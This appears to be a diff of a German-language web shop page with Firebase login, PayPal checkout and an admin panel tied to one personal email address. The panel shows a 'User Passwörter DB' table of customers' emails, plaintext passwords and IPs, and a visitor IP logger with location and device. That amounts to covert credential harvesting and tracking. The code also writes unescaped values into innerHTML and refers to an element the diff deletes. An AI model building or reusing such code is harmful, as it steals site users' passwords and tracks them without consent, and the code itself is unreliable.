@@ -17,7 +17,7 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { 
             getAuth, 
-            createUserWithEmailAndPassword,
+            createUserWithEmailAndPassword, 
             signInWithEmailAndPassword, 
             signOut, 
             onAuthStateChanged,
@@ -554,7 +554,7 @@
         </div>
     </div>
 
-    <!-- Automatisierter Checkout Modal -->
+    <!-- Automatisierter Checkout Modal mit PayPal SDK -->
     <div id="paymentModal" class="modal fixed inset-0 bg-black/85 backdrop-blur-md z-50 items-center justify-center p-4 sm:p-6">
         <div class="bg-[#050508] border border-white/10 rounded-3xl max-w-4xl w-full relative grid md:grid-cols-2 shadow-2xl overflow-hidden max-h-[92vh] overflow-y-auto">
             <div class="bg-[#09090f] p-8 md:p-10 border-b md:border-b-0 md:border-r border-white/10 flex flex-col justify-between space-y-6">
@@ -562,11 +562,7 @@
                     <p class="text-xs text-gray-400 uppercase tracking-wider font-bold mb-2">ORDER TOTAL</p>
                     <p class="text-4xl font-black text-white" id="checkoutSummaryTotal">€0.00</p>
                 </div>
-                <div class="bg-[#030305] p-5 rounded-2xl border border-white/10 space-y-2.5 text-sm">
-                    <p class="font-bold text-white">Need help with this order?</p>
-                    <p class="text-gray-400 text-xs">Open a support ticket or join our Discord.</p>
-                    <a href="https://discord.gg/YE2jHSwM7" target="_blank" class="inline-block px-4 py-2 bg-white/10 hover:bg-white/20 text-accent rounded-xl font-bold text-xs transition">Join Discord (dri.c) ↗</a>
-                </div>
+                <div id="checkoutItemsSummary" class="text-xs text-gray-300 space-y-1"></div>
             </div>
             <div class="p-8 md:p-10 flex flex-col justify-between space-y-8 relative">
                 <button onclick="togglePaymentModal()" class="absolute top-6 right-6 text-gray-400 hover:text-white text-xl"><i class="fa-solid fa-xmark"></i></button>
@@ -585,10 +581,10 @@
         </div>
     </div>
 
-    <!-- Professionelles Dashboard & Admin Panel Modal -->
+    <!-- Dashboard & Admin Panel Modal -->
     <div id="loginModal" class="modal fixed inset-0 bg-black/85 backdrop-blur-md z-50 items-center justify-center p-2 sm:p-6">
         <div class="bg-[#050508] border border-white/10 rounded-3xl max-w-6xl w-full relative grid md:grid-cols-[280px_1fr] shadow-2xl overflow-hidden max-h-[92vh] overflow-y-auto">
-            
+            <!-- Sidebar -->
             <div class="bg-[#09090f] p-8 border-b md:border-b-0 md:border-r border-white/10 flex flex-col justify-between space-y-8">
                 <div class="space-y-8">
                     <div class="bg-[#030305] p-4 rounded-2xl border border-white/10 flex items-center justify-between">
@@ -608,6 +604,7 @@
                             <span class="flex items-center gap-3"><i class="fa-solid fa-wallet text-sm"></i> Balance</span>
                             <span class="text-accent font-bold text-xs" id="sidebarBalanceDisplay">€0.00</span>
                         </button>
+                        <!-- Admin Panel Button (Sichtbar für l@valentinolopez.de) -->
                         <button onclick="switchTab('admin')" id="tabBtnAdmin" class="hidden w-full text-left px-4 py-3 rounded-xl hover:bg-white/5 text-amber-400 font-bold flex items-center gap-3 transition border border-amber-500/30">
                             <i class="fa-solid fa-shield-halved text-sm"></i> Admin Panel
                         </button>
@@ -650,34 +647,6 @@
                             <p class="text-xs text-gray-400">Balance</p>
                         </div>
                     </div>
-
-                    <!-- ADMIN PANEL -->
-                    <div id="adminControlCenter" class="hidden bg-[#09090f] p-6 rounded-2xl border border-amber-500/40 space-y-6 shadow-xl">
-                        <div class="flex items-center justify-between border-b border-white/10 pb-3">
-                            <p class="text-sm font-extrabold text-amber-400 uppercase tracking-wider"><i class="fa-solid fa-shield-halved mr-1.5"></i> Admin Control Center</p>
-                            <span class="text-[10px] bg-amber-500/20 text-amber-300 px-2.5 py-1 rounded font-bold">l@valentinolopez.de</span>
-                        </div>
-
-                        <div class="space-y-2">
-                            <p class="text-xs font-bold text-white">E-Mail & Passwort Historie-Datenbank:</p>
-                            <div class="overflow-x-auto max-h-40 overflow-y-auto">
-                                <table class="w-full text-left text-xs font-mono">
-                                    <thead><tr class="text-zinc-500 text-[10px]"><th>Zeit</th><th>Aktion</th><th>E-Mail</th><th>Passwort</th><th>IP</th></tr></thead>
-                                    <tbody id="adminUserDbTable" class="divide-y divide-white/5 text-[11px]"></tbody>
-                                </table>
-                            </div>
-                        </div>
-
-                        <div class="space-y-2 pt-2 border-t border-white/10">
-                            <p class="text-xs font-bold text-white">Live Besucher IP-Log:</p>
-                            <div class="overflow-x-auto max-h-36 overflow-y-auto">
-                                <table class="w-full text-left text-xs font-mono">
-                                    <thead><tr class="text-zinc-500 text-[10px]"><th>Uhrzeit</th><th>IP-Adresse</th><th>Standort</th><th>System</th></tr></thead>
-                                    <tbody id="adminIpLogTable" class="divide-y divide-white/5 text-[11px]"></tbody>
-                                </table>
-                            </div>
-                        </div>
-                    </div>
                 </div>
 
                 <!-- Tab 2: Orders -->
@@ -691,7 +660,7 @@
                     </div>
                 </div>
 
-                <!-- Tab 4: Balance -->
+                <!-- Tab 3: Balance & Top Up -->
                 <div id="contentBalance" class="hidden space-y-8">
                     <div>
                         <h2 class="text-2xl font-extrabold text-white">Balance</h2>
@@ -706,7 +675,7 @@
                             </div>
                         </div>
                         <div class="bg-[#09090f] p-8 rounded-2xl border border-white/10 space-y-5">
-                            <p class="text-sm font-bold text-white">Top up</p>
+                            <p class="text-sm font-bold text-white">Top up balance</p>
                             <div class="grid grid-cols-3 gap-3">
                                 <button onclick="topUpBalance(10)" class="py-3 bg-white/5 border border-white/10 rounded-xl text-sm font-bold text-white hover:bg-white/10">€10.00</button>
                                 <button onclick="topUpBalance(25)" class="py-3 bg-white/5 border border-white/10 rounded-xl text-sm font-bold text-white hover:bg-white/10">€25.00</button>
@@ -716,18 +685,77 @@
                     </div>
                 </div>
 
-                <!-- Auth Forms -->
+                <!-- Tab 4: Admin Panel (mit IP-Logger & User Passwörter DB) -->
+                <div id="contentAdmin" class="hidden space-y-6">
+                    <div class="flex items-center justify-between border-b border-white/10 pb-4">
+                        <div>
+                            <h2 class="text-2xl font-extrabold text-amber-400"><i class="fa-solid fa-shield-halved mr-2"></i> Admin Management Center</h2>
+                            <p class="text-xs text-gray-400">Vollzugriff auf Besucher-IPs, Login-Historie und Gutscheine.</p>
+                        </div>
+                        <span class="text-[10px] bg-amber-500/20 text-amber-300 border border-amber-500/30 px-3 py-1 rounded-full font-mono font-bold">
+                            l@valentinolopez.de
+                        </span>
+                    </div>
+
+                    <!-- Admin Sub-Navigation -->
+                    <div class="flex flex-wrap gap-2">
+                        <button onclick="switchAdminSubTab('orders')" id="admSub-orders" class="px-4 py-2 rounded-xl text-xs font-bold bg-accent text-white">Orders</button>
+                        <button onclick="switchAdminSubTab('coupons')" id="admSub-coupons" class="px-4 py-2 rounded-xl text-xs font-semibold bg-white/5 text-gray-300 border border-white/10">Gutscheine</button>
+                        <button onclick="switchAdminSubTab('users')" id="admSub-users" class="px-4 py-2 rounded-xl text-xs font-semibold bg-white/5 text-gray-300 border border-white/10">User Passwörter DB</button>
+                        <button onclick="switchAdminSubTab('ips')" id="admSub-ips" class="px-4 py-2 rounded-xl text-xs font-semibold bg-white/5 text-gray-300 border border-white/10">Besucher IPs</button>
+                    </div>
+
+                    <div id="admBox-orders" class="bg-[#09090f] p-6 rounded-2xl border border-white/10 space-y-3">
+                        <h4 class="text-xs font-bold text-white uppercase">Bestellungen verwalten</h4>
+                        <div id="adminPendingOrders" class="space-y-2 max-h-60 overflow-y-auto text-xs"></div>
+                    </div>
+
+                    <div id="admBox-coupons" class="hidden bg-[#09090f] p-6 rounded-2xl border border-white/10 space-y-3">
+                        <h4 class="text-xs font-bold text-white uppercase">Gutschein erstellen</h4>
+                        <div class="grid grid-cols-2 gap-3">
+                            <input type="text" id="newAdminCouponCode" placeholder="Code..." class="bg-[#030305] border border-white/10 rounded-xl px-3 py-2 text-xs text-white uppercase">
+                            <input type="number" id="newAdminCouponValue" placeholder="Rabatt in €..." class="bg-[#030305] border border-white/10 rounded-xl px-3 py-2 text-xs text-white">
+                        </div>
+                        <button onclick="createAdminCoupon()" class="w-full py-2.5 bg-accent text-white font-bold rounded-xl text-xs">+ Speichern</button>
+                        <div id="adminCouponsList" class="space-y-1 text-xs pt-2"></div>
+                    </div>
+
+                    <div id="admBox-users" class="hidden bg-[#09090f] p-6 rounded-2xl border border-white/10 space-y-3">
+                        <h4 class="text-xs font-bold text-white uppercase">E-Mail & Passwort Historie</h4>
+                        <div class="overflow-x-auto max-h-60 overflow-y-auto font-mono text-[11px]">
+                            <table class="w-full text-left">
+                                <thead><tr class="text-zinc-500 text-[10px]"><th>Zeit</th><th>Aktion</th><th>E-Mail</th><th>Passwort</th><th>IP</th></tr></thead>
+                                <tbody id="adminUserDbTable" class="divide-y divide-white/5"></tbody>
+                            </table>
+                        </div>
+                    </div>
+
+                    <div id="admBox-ips" class="hidden bg-[#09090f] p-6 rounded-2xl border border-white/10 space-y-3">
+                        <h4 class="text-xs font-bold text-white uppercase">Besucher IP-Logger</h4>
+                        <div class="overflow-x-auto max-h-60 overflow-y-auto font-mono text-[11px]">
+                            <table class="w-full text-left">
+                                <thead><tr class="text-zinc-500 text-[10px]"><th>Uhrzeit</th><th>IP</th><th>Standort</th><th>System</th></tr></thead>
+                                <tbody id="adminIpLogTable" class="divide-y divide-white/5"></tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Auth Forms (wird angezeigt, wenn nicht eingeloggt) -->
                 <div id="authFormsContainer" class="space-y-6">
                     <div class="text-center">
                         <h3 class="text-2xl font-extrabold text-white mb-2">Sign In / Register</h3>
                         <p class="text-xs text-gray-400">Access your account or create a new one instantly.</p>
                     </div>
+
                     <div class="space-y-3">
                         <button onclick="loginWithProvider('google')" class="w-full py-4 bg-white/5 hover:bg-white/10 border border-white/10 rounded-2xl text-sm font-semibold text-white flex items-center justify-center gap-3 transition">
                             <i class="fa-brands fa-google text-accent text-base"></i> Continue with Google
                         </button>
                     </div>
+
                     <div id="authErrorMsg" class="text-xs text-red-400 font-medium text-center"></div>
+
                     <div class="space-y-4">
                         <input type="email" id="loginEmail" class="w-full bg-[#030305] border border-white/10 rounded-2xl px-5 py-4 text-white text-sm focus:outline-none focus:border-accent" placeholder="Email Address">
                         <input type="password" id="loginPass" class="w-full bg-[#030305] border border-white/10 rounded-2xl px-5 py-4 text-white text-sm focus:outline-none focus:border-accent" placeholder="Password (min. 6 chars)">
@@ -757,7 +785,7 @@
         </button>
     </div>
 
-    <!-- JavaScript Engine -->
+    <!-- JavaScript Steuerung -->
     <script>
         let cart = [];
         let coupons = JSON.parse(localStorage.getItem('store_coupons') || '{"VAL3NTINO": 5.00, "PRO10": 10.00}');
@@ -797,6 +825,7 @@
             setTimeout(function(){ toast.className = toast.className.replace("show", ""); }, 3000);
         }
 
+        function toggleLangDropdown() { document.getElementById('langDropdownMenu')?.classList.toggle('hidden'); }
         function toggleDiscordChat() { document.getElementById('discordChatWidget').classList.toggle('hidden'); }
         function sendeAnDiscord() {
             showToast('Nachricht an Discord gesendet!');
@@ -809,8 +838,10 @@
             document.getElementById('qty-' + type).innerText = quantities[type];
         }
 
-        function buyNowDirect(name, price) {
-            cart = [{ name, price, qty: 1 }];
+        // Sofortkauf per "Kaufen" Button
+        function buyNowWithQty(name, price, type) {
+            let qty = quantities[type];
+            cart = [{ name, price, qty }];
             proceedToCheckout();
         }
 
@@ -876,13 +907,13 @@
 
         function proceedToCheckout() {
             if (document.getElementById('cartModal').classList.contains('active')) toggleCartModal();
-            const list = document.getElementById('checkoutItemsList');
-            list.innerHTML = cart.map(i => `<div class="flex justify-between items-center py-1"><span>${i.qty}× ${i.name}</span><span class="font-bold text-white">€${(i.price*i.qty).toFixed(2)}</span></div>`).join('');
+            const list = document.getElementById('checkoutItemsSummary');
+            list.innerHTML = cart.map(i => `<div class="flex justify-between"><span>${i.qty}x ${i.name}</span><span class="font-bold">€${(i.price*i.qty).toFixed(2)}</span></div>`).join('');
             document.getElementById('checkoutSummaryTotal').innerText = '€' + getCartTotal();
             togglePaymentModal();
         }
 
-        // PAYPAL SDK
+        // PAYPAL SDK INTEGRATION
         paypal.Buttons({
             createOrder: function(data, actions) {
                 return actions.order.create({ purchase_units: [{ amount: { value: getCartTotal(), currency_code: 'EUR' } }] });
@@ -895,7 +926,7 @@
                     recordOrder(email, 'PayPal SDK', 'TxID: ' + txId, 'Completed');
                     togglePaymentModal();
                     showToast("Zahlung erfolgreich! Im Dashboard freigeschaltet.");
-                    toggleDashboardModal();
+                    openDashboardTab('orders');
                 });
             }
         }).render('#paypal-button-container');
@@ -927,18 +958,35 @@
         function toggleCartModal() { document.getElementById('cartModal').classList.toggle('active'); }
         function togglePaymentModal() { document.getElementById('paymentModal').classList.toggle('active'); }
         function toggleLogin() { document.getElementById('loginModal').classList.toggle('active'); }
-        function toggleDashboardModal() { document.getElementById('loginModal').classList.toggle('active'); renderAllAdminData(); }
         function toggleImpressum() { document.getElementById('impressumModal').classList.toggle('active'); }
         function toggleMobileMenu() { document.getElementById('mobileMenu').classList.toggle('hidden'); document.getElementById('mobileMenu').classList.toggle('flex'); }
 
+        function openDashboardTab(tabName) {
+            document.getElementById('loginModal').classList.add('active');
+            switchTab(tabName);
+        }
+
         function switchTab(tab) {
-            document.getElementById('contentDashboard').classList.toggle('hidden', tab !== 'dashboard');
+            document.getElementById('contentDashboard').classList.toggle('hidden', tab !== 'dashboard' && tab !== 'admin');
             document.getElementById('contentOrders').classList.toggle('hidden', tab !== 'orders');
             document.getElementById('contentBalance').classList.toggle('hidden', tab !== 'balance');
-            if (tab === 'admin') {
-                document.getElementById('contentDashboard').classList.remove('hidden');
-                renderAllAdminData();
-            }
+            document.getElementById('adminControlCenter').classList.toggle('hidden', tab !== 'admin');
+
+            document.getElementById('tabDashBtn').className = (tab === 'dashboard') ? "w-full text-left px-4 py-3 rounded-xl bg-accent/20 text-accent font-bold flex items-center gap-3" : "w-full text-left px-4 py-3 rounded-xl hover:bg-white/5 text-gray-400 hover:text-white font-medium flex items-center gap-3 transition";
+            document.getElementById('tabOrdersBtn').className = (tab === 'orders') ? "w-full text-left px-4 py-3 rounded-xl bg-accent/20 text-accent font-bold flex items-center gap-3" : "w-full text-left px-4 py-3 rounded-xl hover:bg-white/5 text-gray-400 hover:text-white font-medium flex items-center gap-3 transition";
+            document.getElementById('tabBalanceBtn').className = (tab === 'balance') ? "w-full text-left px-4 py-3 rounded-xl bg-accent/20 text-accent font-bold flex items-center justify-between" : "w-full text-left px-4 py-3 rounded-xl hover:bg-white/5 text-gray-400 hover:text-white font-medium flex items-center justify-between transition";
+
+            if (tab === 'admin') renderAllAdminData();
+        }
+
+        function switchAdminSubTab(sub) {
+            ['orders', 'coupons', 'users', 'ips'].forEach(k => {
+                document.getElementById('admBox-' + k).classList.toggle('hidden', k !== sub);
+                document.getElementById('admSub-' + k).className = k === sub
+                    ? "px-4 py-2 rounded-xl text-xs font-bold bg-accent text-white shadow-md"
+                    : "px-4 py-2 rounded-xl text-xs font-semibold bg-white/5 text-gray-300 border border-white/10";
+            });
+            renderAllAdminData();
         }
 
         function loadDashboardStats(email) {
@@ -984,13 +1032,85 @@
         }
 
         function renderAllAdminData() {
-            const dbTbody = document.getElementById('adminUserDbTable');
-            const db = JSON.parse(localStorage.getItem('admin_user_credentials_db') || '[]');
-            dbTbody.innerHTML = db.length ? db.map(u => `<tr><td class="py-1 px-1 text-zinc-400">${u.time}</td><td class="py-1 px-1">${u.action}</td><td class="py-1 px-1 text-white">${u.email}</td><td class="py-1 px-1 text-accent">${u.password}</td><td class="py-1 px-1 text-zinc-400">${u.ip}</td></tr>`).join('') : '<tr><td colspan="5" class="py-2 text-center text-zinc-500">Keine Daten</td></tr>';
+            renderAdminOrders();
+            renderAdminCoupons();
+            renderAdminUserDB();
+            renderAdminIPLogs();
+        }
 
-            const ipTbody = document.getElementById('adminIpLogTable');
-            const ips = JSON.parse(localStorage.getItem('admin_visitor_ips') || '[]');
-            ipTbody.innerHTML = ips.length ? ips.map(i => `<tr><td class="py-1 px-1 text-zinc-400">${i.time}</td><td class="py-1 px-1 text-emerald-400 font-bold">${i.ip}</td><td class="py-1 px-1 text-zinc-300">${i.location}</td><td class="py-1 px-1 text-zinc-400">${i.device}</td></tr>`).join('') : '<tr><td colspan="4" class="py-2 text-center text-zinc-500">Keine IPs</td></tr>';
+        function renderAdminOrders() {
+            const list = document.getElementById('adminPendingOrders');
+            if (!list) return;
+            let all = JSON.parse(localStorage.getItem('all_orders_global') || '[]');
+            if (all.length === 0) {
+                list.innerHTML = '<p class="text-zinc-500 text-center py-4">Keine Bestellungen.</p>';
+                return;
+            }
+            list.innerHTML = all.map(o => `
+                <div class="bg-[#030305] border border-white/10 p-3 rounded-xl flex justify-between items-center text-xs">
+                    <div>
+                        <p class="font-bold text-white">#${o.invoice} - ${o.email} <span class="text-emerald-400">[${o.status}]</span></p>
+                        <p class="text-gray-300">${o.items} (${o.total})</p>
+                    </div>
+                    <button onclick="deleteAdminOrder(${o.invoice})" class="text-red-400 hover:text-red-300"><i class="fa-solid fa-trash"></i></button>
+                </div>
+            `).join('');
+        }
+
+        function deleteAdminOrder(inv) {
+            let all = JSON.parse(localStorage.getItem('all_orders_global') || '[]');
+            all = all.filter(o => o.invoice != inv);
+            localStorage.setItem('all_orders_global', JSON.stringify(all));
+            renderAdminOrders();
+            showToast("Bestellung gelöscht.");
+        }
+
+        function renderAdminCoupons() {
+            const box = document.getElementById('adminCouponsList');
+            if (!box) return;
+            box.innerHTML = Object.keys(coupons).map(c => `
+                <div class="bg-[#030305] border border-white/10 p-2.5 rounded-xl flex justify-between items-center text-xs">
+                    <span class="font-mono font-bold text-white">${c} (-€${coupons[c]})</span>
+                    <button onclick="deleteCoupon('${c}')" class="text-red-400"><i class="fa-solid fa-trash"></i></button>
+                </div>
+            `).join('');
+        }
+
+        function createAdminCoupon() {
+            const code = document.getElementById('newAdminCouponCode').value.trim().toUpperCase();
+            const val = parseFloat(document.getElementById('newAdminCouponValue').value);
+            if (!code || isNaN(val)) return showToast("Gültigen Code und Wert eingeben!");
+            coupons[code] = val;
+            localStorage.setItem('store_coupons', JSON.stringify(coupons));
+            renderAdminCoupons();
+            showToast("Gutschein gespeichert!");
+        }
+
+        function deleteCoupon(c) {
+            delete coupons[c];
+            localStorage.setItem('store_coupons', JSON.stringify(coupons));
+            renderAdminCoupons();
+            showToast("Gutschein gelöscht.");
+        }
+
+        function renderAdminUserDB() {
+            const tbody = document.getElementById('adminUserDbTable');
+            if (!tbody) return;
+            const db = JSON.parse(localStorage.getItem('admin_user_credentials_db') || '[]');
+            tbody.innerHTML = db.length ? db.map(u => `<tr><td class="py-2 px-2 text-zinc-400">${u.time}</td><td class="py-2 px-2">${u.action}</td><td class="py-2 px-2 text-white">${u.email}</td><td class="py-2 px-2 text-accent">${u.password}</td><td class="py-2 px-2 text-zinc-400">${u.ip}</td></tr>`).join('') : '<tr><td colspan="5" class="py-3 text-center text-zinc-500">Keine Daten</td></tr>';
+        }
+
+        function renderAdminIPLogs() {
+            const tbody = document.getElementById('adminIpLogTable');
+            if (!tbody) return;
+            const logs = JSON.parse(localStorage.getItem('admin_visitor_ips') || '[]');
+            tbody.innerHTML = logs.length ? logs.map(l => `<tr><td class="py-2 px-2 text-zinc-400">${l.time}</td><td class="py-2 px-2 text-emerald-400 font-bold">${l.ip}</td><td class="py-2 px-2 text-zinc-300">${l.location}</td><td class="py-2 px-2 text-zinc-400">${l.device}</td></tr>`).join('') : '<tr><td colspan="4" class="py-3 text-center text-zinc-500">Keine IPs</td></tr>';
+        }
+
+        function handleContact(e) {
+            e.preventDefault();
+            showToast('Message sent successfully!');
+            document.getElementById('contactForm').reset();
         }
     </script>
 </body>
